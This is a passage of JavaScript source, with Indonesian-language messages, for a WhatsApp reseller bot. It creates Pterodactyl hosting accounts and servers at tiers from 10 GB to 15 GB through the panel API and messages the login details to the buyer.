┗━━━━━━━━━━━━━━━━━━┛
`+readmore+`
*NOTES :*
*⎘ DATA HANYA 1× KIRIM*
*⎘ JAGA BAIK BAIK DATA*
*⎘ GAR? BAWA BUKTI TF*
*⎘ NO MAKSA REFF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "./Rezz.jpg" } }, { upload: RezzHost.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GRUP ETMIN","url":"${gcbuyer}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 PENCET=SALIN USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 PENCET=SALIN PASSWORD",
"copy_code": `${password.toString()}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: "https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k",
newsletterName: "𝗜𝗡𝗭𝗜𝗘 𝗢𝗙𝗖",
serverMessageId: 145
}
}})}}
}, {quoted: m})
await RezzHost.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "𝗜𝗡𝗭𝗜𝗘 𝗢𝗙𝗖",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*Sukses Creat Panel ✅*`+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛\n
Username dan Password Telah Dikirim
Ke @${u.split`@`[0]} Bang @${pushname}`)
}
break
case "10gb": case 'panel10gb': {
if (!isPremium && !isCreator) return m.reply(mess.premium)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "10150"
let cpu = "800"
let disk = "10150"
let email = username + "@inzie.host"
if (!u) return
let d = (await RezzHost.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server untuk @${u.split`@`[0]} bang @${pushname}_`)
let ctf = `
*Hai @${u.split`@`[0]} Ini Data Panel Anda*
*DARI @${m?.sender.split('@')[0]}* `+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password.toString()}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛
`+readmore+`
*NOTES :*
*⎘ DATA HANYA 1× KIRIM*
*⎘ JAGA BAIK BAIK DATA*
*⎘ GAR? BAWA BUKTI TF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "./Rezz.jpg" } }, { upload: RezzHost.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GRUP ETMIN","url":"${gcbuyer}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 PENCET=SALIN USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 PENCET=SALIN PASSWORD",
"copy_code": `${password.toString()}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: "https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k",
newsletterName: "𝗜𝗡𝗭𝗜𝗘 𝗢𝗙𝗖",
serverMessageId: 145
}
}})}}
}, {quoted: m})
await RezzHost.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "𝗜𝗡𝗭𝗜𝗘 𝗢𝗙𝗖",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*Sukses Creat Panel ✅*`+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛\n
Username dan Password Telah Dikirim
Ke @${u.split`@`[0]} Bang ${pushname}`)
}
break
case "11gb": case 'panel11gb': {
if (!isPremium && !isCreator) return m.reply(mess.premium)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "11150"
let cpu = "850"
let disk = "11150"
let email = username + "@inzie.host"
if (!u) return
let d = (await RezzHost.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server untuk @${u.split`@`[0]} bang @${pushname}_`)
let ctf = `
*Hai @${u.split`@`[0]} Ini Data Panel Anda*
*DARI @${m?.sender.split('@')[0]}* `+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password.toString()}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛
`+readmore+`
*NOTES :*
*⎘ DATA HANYA 1× KIRIM*
*⎘ JAGA BAIK BAIK DATA*
*⎘ GAR? BAWA BUKTI TF*
*⎘ NO MAKSA REFF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "./Rezz.jpg" } }, { upload: RezzHost.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GRUP ETMIN","url":"${gcbuyer}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 PENCET=SALIN USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 PENCET=SALIN PASSWORD",
"copy_code": `${password.toString()}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: "https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k",
newsletterName: "𝗜𝗡𝗭𝗜𝗘 𝗢𝗙𝗖",
serverMessageId: 145
}
}})}}
}, {quoted: m})
await RezzHost.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "𝗜𝗡𝗭𝗜𝗘 𝗢𝗙𝗖",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*Sukses Creat Panel ✅*`+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛\n
Username dan Password Telah Dikirim
Ke @${u.split`@`[0]} Bang ${pushname}`)
}
break
case "12gb": case 'panel12gb': {
if (!isPremium && !isCreator) return m.reply(mess.premium)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "12150"
let cpu = "900"
let disk = "12150"
let email = username + "@inzie.host"
if (!u) return
let d = (await RezzHost.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server untuk @${u.split`@`[0]} bang @${pushname}_`)
let ctf = `
*Hai @${u.split`@`[0]} Ini Data Panel Anda*
*DARI @${m?.sender.split('@')[0]}* `+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password.toString()}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛
`+readmore+`
*NOTES :*
*⎘ DATA HANYA 1× KIRIM*
*⎘ JAGA BAIK BAIK DATA*
*⎘ GAR? BAWA BUKTI TF*
*⎘ NO MAKSA REFF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "./Rezz.jpg" } }, { upload: RezzHost.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GRUP ETMIN","url":"${gcbuyer}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 PENCET=SALIN USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 PENCET=SALIN PASSWORD",
"copy_code": `${password.toString()}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: "https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k",
newsletterName: "𝗜𝗡𝗭𝗜𝗘 𝗢𝗙𝗖",
serverMessageId: 145
}
}})}}
}, {quoted: m})
await RezzHost.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "𝗜𝗡𝗭𝗜𝗘 𝗢𝗙𝗖",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*Sukses Creat Panel ✅*`+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛\n
Username dan Password Telah Dikirim
Ke @${u.split`@`[0]} Bang @${pushname}`)
}
break
case "13gb": case 'panel13gb': {
if (!isPremium && !isCreator) return m.reply(mess.premium)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "13150"
let cpu = "900"
let disk = "13150"
let email = username + "@inzie.host"
if (!u) return
let d = (await RezzHost.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server untuk @${u.split`@`[0]} bang @${pushname}_`)
let ctf = `
*Hai @${u.split`@`[0]} Ini Data Panel Anda*
*DARI @${m?.sender.split('@')[0]}* `+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password.toString()}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛
`+readmore+`
*NOTES :*
*⎘ DATA HANYA 1× KIRIM*
*⎘ JAGA BAIK BAIK DATA*
*⎘ GAR? BAWA BUKTI TF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "./Rezz.jpg" } }, { upload: RezzHost.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GRUP ETMIN","url":"${gcbuyer}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 PENCET=SALIN USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 PENCET=SALIN PASSWORD",
"copy_code": `${password.toString()}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: "https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k",
newsletterName: "𝗜𝗡𝗭𝗜𝗘 𝗢𝗙𝗖",
serverMessageId: 145
}
}})}}
}, {quoted: m})
await RezzHost.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "𝗜𝗡𝗭𝗜𝗘 𝗢𝗙𝗖",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*Sukses Creat Panel ✅*`+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛\n
Username dan Password Telah Dikirim
Ke @${u.split`@`[0]} Bang ${pushname}`)
}
break
case "14gb": case 'panel14gb': {
if (!isPremium && !isCreator) return m.reply(mess.premium)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "14150"
let cpu = "900"
let disk = "14150"
let email = username + "@inzie.host"
if (!u) return
let d = (await RezzHost.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server untuk @${u.split`@`[0]} bang @${pushname}_`)
let ctf = `
*Hai @${u.split`@`[0]} Ini Data Panel Anda*
*DARI @${m?.sender.split('@')[0]}* `+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password.toString()}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛
`+readmore+`
*NOTES :*
*⎘ DATA HANYA 1× KIRIM*
*⎘ JAGA BAIK BAIK DATA*
*⎘ GAR? BAWA BUKTI TF*
*⎘ NO MAKSA REFF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "./Rezz.jpg" } }, { upload: RezzHost.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GRUP ETMIN","url":"${gcbuyer}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 PENCET=SALIN USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 PENCET=SALIN PASSWORD",
"copy_code": `${password.toString()}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: "https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k",
newsletterName: "𝗜𝗡𝗭𝗜𝗘 𝗢𝗙𝗖",
serverMessageId: 145
}
}})}}
}, {quoted: m})
await RezzHost.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "𝗜𝗡𝗭𝗜𝗘 𝗢𝗙𝗖",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*Sukses Creat Panel ✅*`+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛\n
Username dan Password Telah Dikirim
Ke @${u.split`@`[0]} Bang ${pushname}`)
}
break
case "15gb": case 'panel15gb': {
if (!isPremium && !isCreator) return m.reply(mess.premium)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "15250"
let cpu = "900"
let disk = "15250"
let email = username + "@inzie.host"
if (!u) return
let d = (await RezzHost.onWhatsApp(u.split`@`[0]))[0] || {}
